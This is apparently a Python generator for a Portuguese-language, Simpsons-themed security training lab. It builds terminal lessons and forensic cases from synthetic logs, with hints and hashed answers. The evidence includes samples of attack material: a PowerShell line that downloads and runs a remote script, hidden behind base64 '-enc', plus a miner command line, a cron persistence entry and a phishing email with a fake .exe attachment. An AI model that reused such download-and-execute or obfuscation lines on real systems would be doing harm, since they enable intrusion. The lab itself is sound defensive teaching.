#!/usr/bin/env python3
"""Gera os casos do Laboratorio Springfield (evidencias sinteticas + casos.json).

Uso: python3 scripts/gen-lab.py
Escreve em config/includes.chroot/usr/share/dohsec/lab/. As respostas so vao para o
casos.json como hash; este gerador fica fora da imagem.

Tudo e ficticio: IPs de documentacao (RFC 5737), dominios .test, nenhum binario.
"""
import base64
import hashlib
import json
import random
import shutil
from datetime import datetime, timedelta
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

OUT = Path(__file__).resolve().parent.parent / "config/includes.chroot/usr/share/dohsec/lab"
INICIO = datetime(2026, 3, 14, 7, 0, 0)
FUNCIONARIOS = ["homer", "lenny", "carl", "marge", "smithers", "frank.grimes"]


def normaliza(resposta):
    return resposta.strip().strip("'\"").strip().lower()


def hash_resposta(resposta):
    return hashlib.sha256(normaliza(resposta).encode()).hexdigest()


def escreve(caso, nome, conteudo):
    p = OUT / "casos" / caso / nome
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(conteudo, newline="\n")


def leiame(caso, titulo, contexto, pergunta, arquivos):
    lista = "\n".join(f"- `{a}`" for a in arquivos)
    escreve(caso, "LEIAME.md", f"""# {titulo}

## Contexto

{contexto}

## Evidencias

{lista}

## Pergunta

{pergunta}

Responda com `lab responder {caso[:2].lstrip('0')} "sua resposta"`. Travou? `lab dica {caso[:2].lstrip('0')}`.
""")


# ---------------------------------------------------------------------------
# Trilha do Estagiario: aulas de terminal antes dos casos
# ---------------------------------------------------------------------------
def aula_leiame(aula, titulo, explicacao, desafio):
    n = aula[:2].lstrip("0")
    escreve(aula, "LEIAME.md", f"""# {titulo}

{explicacao}

## Desafio

{desafio}

Responda com `lab responder {n} "sua resposta"`. Travou? `lab dica {n}`.
""")


def aula_pastas(rnd, aula):
    palavra = "rosquinha-azul"
    escreve(aula, "usina/refeitorio/cardapio.txt", "Segunda: donut\nTerca: donut\nQuarta: donut recheado\n")
    escreve(aula, "usina/reator/aviso.txt", "Nao encoste em nada brilhante.\n")
    escreve(aula, "usina/sala-de-controle/painel/status.txt", "Reator: estavel (por enquanto)\n")
    escreve(aula, "usina/sala-de-controle/gaveta/bilhete.txt",
            f"Homer, a palavra-chave do cofre de donuts e: {palavra}\nAss: Lenny\n")
    aula_leiame(aula, "Aula 1: andando pelas pastas", """O terminal e uma conversa: voce digita um comando, aperta Enter e ele responde.
Tudo no Linux fica em pastas, uma dentro da outra.

| Comando | O que faz | Exemplo |
| --- | --- | --- |
| `pwd` | mostra em qual pasta voce esta | `pwd` |
| `ls` | lista o que tem na pasta | `ls usina` |
| `cd` | entra numa pasta | `cd usina/reator` |
| `cd ..` | volta uma pasta | `cd ..` |
| `cat` | mostra o conteudo de um arquivo | `cat aviso.txt` |

Dica de ouro: aperte **Tab** no meio de um nome que o terminal completa para voce.""",
                """Dentro da pasta `usina` tem uma sala de controle. Em algum lugar dela ha um bilhete.
Qual e a palavra-chave escrita no bilhete?""")
    return {
        "id": aula, "titulo": "Andando pelas pastas", "trilha": "estagiario", "nivel": "basico",
        "pergunta": "Qual e a palavra-chave escrita no bilhete da sala de controle?",
        "resposta": hash_resposta(palavra),
        "dicas": ["Comece com: ls usina",
                  "Entre na sala: cd usina/sala-de-controle e rode ls de novo.",
                  "Achou a gaveta? cat gaveta/bilhete.txt"],
        "aprendizado": ["pwd mostra onde voce esta, ls lista, cd entra e cd .. volta.",
                        "cat mostra o conteudo de um arquivo de texto.",
                        "Tab completa nomes: menos digitacao, menos erro."],
    }


def aula_escondidos(rnd, aula):
    palavra = "granulado"
    escreve(aula, "armario/uniforme.txt", "Camisa branca, gravata verde.\n")
    escreve(aula, "armario/marmita.txt", "Hoje tem donut. Amanha tambem.\n")
    escreve(aula, "armario/.esconderijo", f"Ninguem vai achar aqui. Senha do armario: {palavra}\n")
    aula_leiame(aula, "Aula 2: arquivos escondidos", """No Linux, arquivo cujo nome comeca com ponto (`.`) fica escondido: o `ls` normal nao mostra.
Configuracoes e, as vezes, coisas suspeitas ficam assim.

| Comando | O que faz |
| --- | --- |
| `ls -a` | lista tudo, inclusive os escondidos |
| `ls -la` | lista tudo com detalhes (dono, tamanho, data) |

Investigadores sempre olham com `ls -la`: invasor adora esconder arquivo com ponto na frente.""",
                """O armario do Homer parece ter so duas coisas. Parece.
Qual e a senha escrita no arquivo escondido?""")
    return {
        "id": aula, "titulo": "Arquivos escondidos", "trilha": "estagiario", "nivel": "basico",
        "pergunta": "Qual e a senha escrita no arquivo escondido do armario?",
        "resposta": hash_resposta(palavra),
        "dicas": ["ls armario mostra so os arquivos visiveis.",
                  "Tente: ls -a armario",
                  "O arquivo comeca com ponto: cat armario/.esconderijo"],
        "aprendizado": ["Nome comecando com ponto = arquivo escondido.",
                        "ls -la mostra tudo, com dono, tamanho e data.",
                        "Em investigacao, sempre liste com -a: o que esta escondido costuma ser o mais interessante."],
    }


def aula_grep(rnd, aula):
    linhas = []
    t = INICIO
    eventos = ["porta do refeitorio aberta", "cafe reabastecido", "cracha lido na catraca",
               "temperatura do reator normal", "elevador chamado no 2o andar", "impressora sem papel"]
    for _ in range(600):
        t += timedelta(seconds=rnd.randint(10, 60))
        linhas.append(f"{t:%H:%M:%S} INFO {rnd.choice(eventos)}")
    alvo = 417
    linhas[alvo - 1] = linhas[alvo - 1][:9] + "ALERTA vazamento detectado no setor 7G"
    escreve(aula, "turno.log", "\n".join(linhas) + "\n")
    aula_leiame(aula, "Aula 3: procurando com grep", """Logs tem milhares de linhas. Ninguem le tudo: a gente procura.

| Comando | O que faz | Exemplo |
| --- | --- | --- |
| `less` | abre arquivo grande para rolar (q sai, / procura) | `less turno.log` |
| `head` / `tail` | mostram o comeco / o fim | `tail -5 turno.log` |
| `grep` | mostra so as linhas com uma palavra | `grep cafe turno.log` |
| `grep -n` | mostra tambem o numero da linha | `grep -n cafe turno.log` |
| `grep -i` | ignora maiusculas e minusculas | `grep -i CAFE turno.log` |""",
                """O `turno.log` tem 600 linhas de rotina e uma linha de ALERTA.
Em qual numero de linha esta o alerta?""")
    return {
        "id": aula, "titulo": "Procurando com grep", "trilha": "estagiario", "nivel": "basico",
        "pergunta": "Em qual numero de linha do turno.log esta o ALERTA?",
        "resposta": hash_resposta(str(alvo)),
        "dicas": ["grep mostra so as linhas com a palavra: grep ALERTA turno.log",
                  "Para ver o numero da linha: grep -n ALERTA turno.log",
                  "A resposta e so o numero, antes dos dois-pontos."],
        "aprendizado": ["grep PALAVRA arquivo mostra so as linhas que interessam.",
                        "-n mostra o numero da linha, -i ignora maiusculas.",
                        "less, head e tail ajudam a olhar arquivos grandes sem se perder."],
    }


def aula_pipe(rnd, aula):
    linhas = []
    falhas = 0
    t = INICIO
    for _ in range(800):
        t += timedelta(seconds=rnd.randint(5, 40))
        if rnd.random() < 0.06:
            falhas += 1
            linhas.append(f"{t:%H:%M:%S} FALHA bomba de resfriamento {rnd.randint(1, 4)} sem resposta")
        else:
            linhas.append(f"{t:%H:%M:%S} OK bomba de resfriamento {rnd.randint(1, 4)} operando")
    escreve(aula, "bombas.log", "\n".join(linhas) + "\n")
    aula_leiame(aula, "Aula 4: contando com pipe", """O pipe (`|`) liga comandos: a saida de um vira a entrada do outro.
E como uma esteira da fabrica de donuts.

| Comando | O que faz | Exemplo |
| --- | --- | --- |
| `wc -l` | conta linhas | `wc -l bombas.log` |
| `A \\| B` | passa a saida de A para B | `grep OK bombas.log \\| wc -l` |

Leia o exemplo assim: "pegue as linhas com OK e conte quantas sao".""",
                """Quantas vezes as bombas de resfriamento registraram FALHA no `bombas.log`?""")
    return {
        "id": aula, "titulo": "Contando com pipe", "trilha": "estagiario", "nivel": "basico",
        "pergunta": "Quantas linhas de FALHA tem no bombas.log?",
        "resposta": hash_resposta(str(falhas)),
        "dicas": ["Primeiro veja as falhas: grep FALHA bombas.log",
                  "Agora conte: ligue o grep ao wc -l com um pipe (|).",
                  "grep FALHA bombas.log | wc -l"],
        "aprendizado": ["O pipe | liga comandos: a saida de um vira a entrada do proximo.",
                        "grep ALGO arquivo | wc -l conta quantas linhas tem ALGO.",
                        "Com pipe voce monta perguntas grandes juntando comandos pequenos."],
    }


def aula_colunas(rnd, aula):
    pessoas = ["homer", "lenny", "carl", "marge", "smithers", "frank.grimes", "moe"]
    pesos = [5, 9, 8, 2, 4, 3, 1]
    linhas = ["horario,pessoa,porta"]
    t = INICIO
    contagem = {}
    for _ in range(300):
        t += timedelta(minutes=rnd.randint(1, 4))
        p = rnd.choices(pessoas, weights=pesos)[0]
        contagem[p] = contagem.get(p, 0) + 1
        porta = rnd.choice(["catraca-1", "catraca-2", "sala-de-controle", "refeitorio"])
        linhas.append(f"{t:%H:%M},{p},{porta}")
    mais = max(contagem, key=contagem.get)
    escreve(aula, "cracha.csv", "\n".join(linhas) + "\n")
    aula_leiame(aula, "Aula 5: filtrando colunas", """Arquivos CSV sao tabelas: cada linha e um registro e as colunas sao separadas por virgula.

| Comando | O que faz | Exemplo |
| --- | --- | --- |
| `cut -d, -f2` | pega a 2a coluna (separador virgula) | `cut -d, -f2 cracha.csv` |
| `sort` | ordena | `... \\| sort` |
| `uniq -c` | junta repetidos e conta | `... \\| sort \\| uniq -c` |
| `sort -rn` | ordena por numero, do maior para o menor | `... \\| sort -rn` |
| `head -1` | fica so com a primeira linha | `... \\| head -1` |

Essa receita (`cut | sort | uniq -c | sort -rn`) e a mais usada em analise de log. Guarde ela.""",
                """O `cracha.csv` registra cada passagem de cracha.
Quem passou o cracha mais vezes?""")
    return {
        "id": aula, "titulo": "Filtrando colunas", "trilha": "estagiario", "nivel": "basico",
        "pergunta": "Quem passou o cracha mais vezes?",
        "resposta": hash_resposta(mais),
        "dicas": ["Pegue so a coluna das pessoas: cut -d, -f2 cracha.csv",
                  "Junte e conte os repetidos: cut -d, -f2 cracha.csv | sort | uniq -c",
                  "Ordene do maior para o menor: ... | sort | uniq -c | sort -rn | head -1"],
        "aprendizado": ["cut pega colunas, sort ordena, uniq -c conta repetidos.",
                        "A receita cut | sort | uniq -c | sort -rn responde 'quem/o que mais aparece'.",
                        "Essa mesma receita acha o IP que mais atacou, o usuario que mais errou senha e por ai vai."],
    }


# ---------------------------------------------------------------------------
# 6. Brute force em conta de servico
# ---------------------------------------------------------------------------
def caso_forca_bruta(rnd, caso):
    vencedor = "198.51.100.77"
    atacantes = [f"203.0.113.{n}" for n in rnd.sample(range(10, 250), 12)] + [vencedor]
    linhas = []
    t = INICIO - timedelta(hours=6)
    pid = 4100
    for _ in range(2600):
        t += timedelta(seconds=rnd.randint(1, 20))
        pid += 1
        ts = t.strftime("%b %d %H:%M:%S")
        r = rnd.random()
        if r < 0.55:
            ip = rnd.choice(atacantes[:-1])
            usuario = rnd.choice(["svc_backup", "svc_backup", "admin", "root", "oracle"])
            linhas.append(f"{ts} usina-bkp01 sshd[{pid}]: Failed password for {usuario} from {ip} port {rnd.randint(30000, 65000)} ssh2")
        elif r < 0.62:
            linhas.append(f"{ts} usina-bkp01 sshd[{pid}]: Failed password for svc_backup from {vencedor} port {rnd.randint(30000, 65000)} ssh2")
        elif r < 0.9:
            u = rnd.choice(FUNCIONARIOS)
            linhas.append(f"{ts} usina-bkp01 sshd[{pid}]: Accepted publickey for {u} from 10.20.{rnd.randint(1, 9)}.{rnd.randint(2, 250)} port {rnd.randint(30000, 65000)} ssh2")
        else:
            linhas.append(f"{ts} usina-bkp01 CRON[{pid}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    # a entrada que importa, no meio do log
    meio = len(linhas) * 2 // 3
    ts = linhas[meio][:15]
    linhas.insert(meio, f"{ts} usina-bkp01 sshd[9999]: Accepted password for svc_backup from {vencedor} port 51515 ssh2")
    escreve(caso, "evidencias/auth.log", "\n".join(linhas) + "\n")
    leiame(caso, "Brute force em conta de servico",
           "O servidor de backup `usina-bkp01` recebeu milhares de tentativas de login por SSH durante a "
           "madrugada. A conta de servico `svc_backup` usa senha (e nao chave), entao o time desconfia "
           "que alguem conseguiu entrar.",
           "Qual IP conseguiu entrar na conta `svc_backup`?",
           ["evidencias/auth.log"])
    return {
        "id": caso, "titulo": "Brute force em conta de servico", "trilha": "analista",
        "aprendizado": ['O que aconteceu: alguem testou milhares de senhas ate acertar a da conta svc_backup (ataque de forca bruta).',
            'Por que e perigoso: contas de servico costumam ter muito acesso e ninguem percebe quando sao usadas.',
            'Como se previne: login por chave em vez de senha, bloqueio apos varias falhas, MFA e alerta para login de IP de fora.', "Comando que ficou: grep 'Accepted' auth.log"], "nivel": "facil",
        "pergunta": "Qual IP conseguiu entrar na conta svc_backup?",
        "resposta": hash_resposta(vencedor),
        "dicas": [
            "Login que deu certo aparece como 'Accepted' no auth.log.",
            "Filtre por usuario: grep 'Accepted' auth.log | grep svc_backup",
            "Os funcionarios entram por chave (publickey); o invasor entrou por senha (password).",
        ],
    }


# ---------------------------------------------------------------------------
# 7. PowerShell encoded no Financeiro
# ---------------------------------------------------------------------------
def caso_powershell(rnd, caso):
    dominio = "atualiza-donut.test"
    script = f"IEX (New-Object Net.WebClient).DownloadString('http://{dominio}/folha.ps1')"
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    processos = [
        ("explorer.exe", "chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
        ("explorer.exe", "EXCEL.EXE", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /dde'),
        ("services.exe", "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
        ("explorer.exe", "OUTLOOK.EXE", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'),
        ("svchost.exe", "taskhostw.exe", "taskhostw.exe Install $(Arg0)"),
        ("explorer.exe", "powershell.exe", "powershell.exe -NoProfile -Command Get-Date"),
    ]
    linhas = ["timestamp,host,usuario,processo_pai,processo,linha_de_comando"]
    t = INICIO
    for _ in range(420):
        t += timedelta(seconds=rnd.randint(5, 90))
        host = f"FIN-WS{rnd.randint(1, 8):02d}"
        pai, proc, cmd = rnd.choice(processos)
        linhas.append(f'{t.isoformat()},{host},{rnd.choice(FUNCIONARIOS)},{pai},{proc},"{cmd.replace(chr(34), chr(34) * 2)}"')
    t_ataque = linhas[260].split(",")[0]
    linhas.insert(260, f'{t_ataque},FIN-WS03,lenny,WINWORD.EXE,powershell.exe,'
                       f'"powershell.exe -NoP -W Hidden -enc {enc}"')
    escreve(caso, "evidencias/processos.csv", "\n".join(linhas) + "\n")
    leiame(caso, "PowerShell encoded no Financeiro",
           "O antivirus da estacao `FIN-WS03` alertou sobre um PowerShell com comando codificado. "
           "Os processos das estacoes do Financeiro na manha do incidente foram exportados.",
           "Qual dominio o comando codificado tenta contatar?",
           ["evidencias/processos.csv"])
    return {
        "id": caso, "titulo": "PowerShell encoded no Financeiro", "trilha": "analista",
        "aprendizado": ['O que aconteceu: um documento do Word abriu um PowerShell escondido que baixa um script da internet.',
            'Por que e perigoso: o -enc esconde o comando de quem olha rapido; e um truque comum para fugir de filtros.',
            'Como se previne: bloquear macros de documentos da internet, registrar os comandos do PowerShell e alertar quando o Word abre um PowerShell.', "Comando que ficou: echo 'VALOR' | base64 -d | iconv -f utf-16le"], "nivel": "medio",
        "pergunta": "Qual dominio o comando codificado tenta contatar?",
        "resposta": hash_resposta(dominio),
        "dicas": [
            "Procure o parametro -enc (EncodedCommand) no CSV.",
            "O valor e base64. Decodifique com: echo 'VALOR' | base64 -d",
            "O PowerShell codifica em UTF-16LE: echo 'VALOR' | base64 -d | iconv -f utf-16le",
        ],
    }


# ---------------------------------------------------------------------------
# 8. Servidor minerando donutcoin
# ---------------------------------------------------------------------------
def caso_donutcoin(rnd, caso):
    persistencia = "/var/tmp/.cache/kdonut-watch.sh"
    ps = ["USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
          "root           1  0.0  0.1 167432 11924 ?        Ss   mar14   0:04 /sbin/init",
          "root         412  0.0  0.2  48212 18320 ?        Ss   mar14   0:01 /lib/systemd/systemd-journald",
          "root         803  0.0  0.0   8564  3120 ?        Ss   mar14   0:00 /usr/sbin/cron -f",
          "root         911  0.0  0.1  15432  9120 ?        Ss   mar14   0:00 sshd: /usr/sbin/sshd -D",
          "www-data    1204  0.3  1.2 214332 98120 ?        S    mar14   1:12 /usr/sbin/apache2 -k start",
          "www-data    1205  0.2  1.1 214332 91220 ?        S    mar14   1:03 /usr/sbin/apache2 -k start",
          "www-data    6672 97.8  4.1 892344 331220 ?       Sl   02:13 703:41 /tmp/.X11-unix/.kdonut -o pool.donutcoin.test:3333 -u springfield -p x --donate-level 0",
          "postgres    1301  0.0  0.8 220112 66110 ?        Ss   mar14   0:09 /usr/lib/postgresql/15/bin/postgres",
          "root        7012  0.0  0.0  10072  3344 pts/0    R+   14:02   0:00 ps aux"]
    escreve(caso, "evidencias/ps.txt", "\n".join(ps) + "\n")
    cron = ["# crontab -l -u www-data",
            "# m h  dom mon dow   command",
            "0 3 * * * /usr/bin/php /var/www/usina/limpa_sessoes.php > /dev/null 2>&1",
            f"*/5 * * * * {persistencia} > /dev/null 2>&1",
            "",
            "# crontab -l -u root",
            "30 2 * * * /usr/local/sbin/backup-usina.sh"]
    escreve(caso, "evidencias/crontabs.txt", "\n".join(cron) + "\n")
    net = ["Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name",
           "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      911/sshd",
           "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1204/apache2",
           "tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      1301/postgres",
           "tcp        0    212 10.20.5.14:48812        198.51.100.33:3333      ESTABLISHED 6672/.kdonut",
           "tcp        0      0 10.20.5.14:80           10.20.2.77:51022        TIME_WAIT   -"]
    escreve(caso, "evidencias/conexoes.txt", "\n".join(net) + "\n")
    leiame(caso, "Servidor minerando donutcoin",
           "O servidor web `usina-web02` esta com CPU em 100% ha horas. O time matou um processo "
           "estranho, mas 5 minutos depois ele voltou.",
           "Qual arquivo garante que o minerador volta depois de ser morto? (caminho completo)",
           ["evidencias/ps.txt", "evidencias/crontabs.txt", "evidencias/conexoes.txt"])
    return {
        "id": caso, "titulo": "Servidor minerando donutcoin", "trilha": "analista",
        "aprendizado": ['O que aconteceu: um invasor usou o servidor web para minerar criptomoeda e agendou no cron um script que religa o minerador.',
            'Por que e perigoso: matar o processo nao resolve; sem remover a persistencia, o problema volta sozinho.',
            'Como se previne: manter o site e o sistema atualizados, monitorar CPU e conexoes de saida, revisar crontabs.',
            'Comando que ficou: crontab -l -u USUARIO'], "nivel": "medio",
        "pergunta": "Qual arquivo garante que o minerador volta depois de ser morto?",
        "resposta": hash_resposta(persistencia),
        "dicas": [
            "Primeiro ache o minerador: qual processo usa quase 100% de CPU e de qual usuario ele e?",
            "Algo agendado roda a cada 5 minutos para religar o processo.",
            "Olhe o crontab do mesmo usuario do processo minerador.",
        ],
    }


# ---------------------------------------------------------------------------
# 9. invoice_real.pdf.exe
# ---------------------------------------------------------------------------
def caso_pdf_exe(rnd, caso):
    dominio = "burns-faturas.test"
    anexo = base64.b64encode("Arquivo de treinamento do Laboratorio Springfield. Nao e executavel.".encode()).decode()
    eml = f"""Return-Path: <cobranca@{dominio}>
Received: from mail.{dominio} (mail.{dominio} [203.0.113.150])
	by mx.usina-springfield.test with ESMTP id 4QxDoh
	for <lenny@usina-springfield.test>; Sat, 14 Mar 2026 09:12:44 -0300
Received-SPF: fail (usina-springfield.test: domain of cobranca@{dominio} does not designate 203.0.113.150 as permitted sender)
Authentication-Results: mx.usina-springfield.test; spf=fail smtp.mailfrom={dominio}; dkim=none; dmarc=fail header.from=usina-springfield.test
From: "Financeiro Usina" <financeiro@usina-springfield.test>
Reply-To: <financeiro.urgente@{dominio}>
To: lenny@usina-springfield.test
Subject: URGENTE: fatura vencida - corte de energia hoje
Date: Sat, 14 Mar 2026 09:12:40 -0300
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="donut"

--donut
Content-Type: text/plain; charset=utf-8

Lenny,

Segue a fatura em atraso. Se nao for paga ate as 12h a usina tera a energia cortada.
Abra o anexo e confirme o pagamento.

Financeiro

--donut
Content-Type: application/octet-stream; name="invoice_real.pdf.exe"
Content-Disposition: attachment; filename="invoice_real.pdf.exe"
Content-Transfer-Encoding: base64

{anexo}
--donut--
"""
    escreve(caso, "evidencias/email.eml", eml)
    leiame(caso, "invoice_real.pdf.exe executado",
           "O Lenny abriu um anexo de um e-mail 'do Financeiro' e o Defender desligou logo depois. "
           "O e-mail original foi exportado do servidor.",
           "Qual o dominio real de quem enviou o e-mail?",
           ["evidencias/email.eml"])
    return {
        "id": caso, "titulo": "invoice_real.pdf.exe executado", "trilha": "analista",
        "aprendizado": ['O que aconteceu: phishing. O From dizia Financeiro, mas o e-mail saiu de outro dominio, e o anexo era um programa disfarcado de PDF.',
            'Por que e perigoso: o campo From e escrito por quem envia; so os outros cabecalhos mostram a origem real.',
            'Como se previne: SPF, DKIM e DMARC configurados, mostrar extensoes de arquivo no Windows e desconfiar de urgencia.', "Comando que ficou: grep -iE '^(Return-Path|Received|Authentication-Results)' email.eml"], "nivel": "facil",
        "pergunta": "Qual o dominio real de quem enviou o e-mail?",
        "resposta": hash_resposta(dominio),
        "dicas": [
            "O campo From: pode ser escrito por qualquer um. Olhe os outros cabecalhos.",
            "Return-Path e Received mostram de onde a mensagem saiu de verdade.",
            "O SPF falhou para qual dominio?",
        ],
    }


# ---------------------------------------------------------------------------
# 10. Everyone em grupo privilegiado
# ---------------------------------------------------------------------------
def caso_everyone(rnd, caso):
    culpado = "estagiario.ralph"
    grupos = ["Usuarios da Usina", "Financeiro", "Operadores do Reator", "Manutencao", "Admins da Usina", "VPN"]
    admins = ["ti.patty", "ti.selma", "smithers"]
    linhas = ["grupo,membro,adicionado_por,adicionado_em"]
    t = INICIO - timedelta(days=200)
    for _ in range(230):
        t += timedelta(hours=rnd.randint(1, 30))
        g = rnd.choice(grupos)
        m = rnd.choice(FUNCIONARIOS + ["apu", "moe", "barney", "otto", "willie"])
        if g == "Admins da Usina":
            m = rnd.choice(["ti.patty", "ti.selma", "smithers"])
        linhas.append(f"{g},{m},{rnd.choice(admins)},{t.isoformat()}")
    linhas.insert(150, f"Admins da Usina,Everyone,{culpado},{(INICIO - timedelta(days=3)).isoformat()}")
    escreve(caso, "evidencias/grupos.csv", "\n".join(linhas) + "\n")
    leiame(caso, "Everyone em grupo privilegiado",
           "Uma auditoria achou o grupo `Everyone` dentro de um grupo administrativo do dominio. "
           "Isso da poder de administrador para qualquer conta. O historico de alteracoes de grupos "
           "foi exportado.",
           "Qual conta adicionou o Everyone no grupo privilegiado?",
           ["evidencias/grupos.csv"])
    return {
        "id": caso, "titulo": "Everyone em grupo privilegiado", "trilha": "analista",
        "aprendizado": ['O que aconteceu: uma conta sem necessidade de acesso adicionou o grupo Everyone (todo mundo) num grupo de administradores.',
            'Por que e perigoso: qualquer conta da empresa virou administradora, inclusive uma conta invadida.',
            'Como se previne: menor privilegio, revisao periodica de acessos e alerta sempre que um grupo administrativo muda.',
            'Comando que ficou: grep Everyone grupos.csv'], "nivel": "facil",
        "pergunta": "Qual conta adicionou o Everyone no grupo privilegiado?",
        "resposta": hash_resposta(culpado),
        "dicas": [
            "Procure a linha em que o membro e Everyone: grep Everyone grupos.csv",
            "A terceira coluna diz quem fez a alteracao.",
        ],
    }


def ordem():
    """Ordem dos casos no laboratorio (a numeracao sai daqui)."""
    import lab_casos as extra
    import lab_esboco as esboco
    import lab_ferramentas as ferramentas
    return [
        # Nivel 0: Estagiario
        ("andando-pelas-pastas", aula_pastas), ("arquivos-escondidos", aula_escondidos),
        ("procurando-com-grep", aula_grep), ("contando-com-pipe", aula_pipe),
        ("filtrando-colunas", aula_colunas),
        *extra.ESTAGIARIO,
        # Nivel 1: Operador
        *extra.OPERADOR, *esboco.OPERADOR, *ferramentas.OPERADOR,
        # Nivel 2: Analista SOC
        ("forca-bruta", caso_forca_bruta), ("powershell-financeiro", caso_powershell),
        ("donutcoin", caso_donutcoin), ("pdf-exe", caso_pdf_exe),
        ("everyone-privilegiado", caso_everyone),
        *extra.ANALISTA, *esboco.ANALISTA, *ferramentas.ANALISTA,
        # Nivel 3: Especialista
        *extra.ESPECIALISTA, *esboco.ESPECIALISTA, *ferramentas.ESPECIALISTA,
        # Teste final do Sr. Burns
        *extra.FINAL,
    ]


def main():
    if (OUT / "casos").exists():
        shutil.rmtree(OUT / "casos")
    rnd = random.Random(742)
    casos = []
    for slug, f in ordem():
        casos.append(f(rnd, f"{len(casos) + 1:02d}-{slug}"))
    (OUT / "casos.json").write_text(json.dumps(casos, ensure_ascii=False, indent=2) + "\n", newline="\n")
    print(f"{len(casos)} casos em {OUT}")


if __name__ == "__main__":
    main()
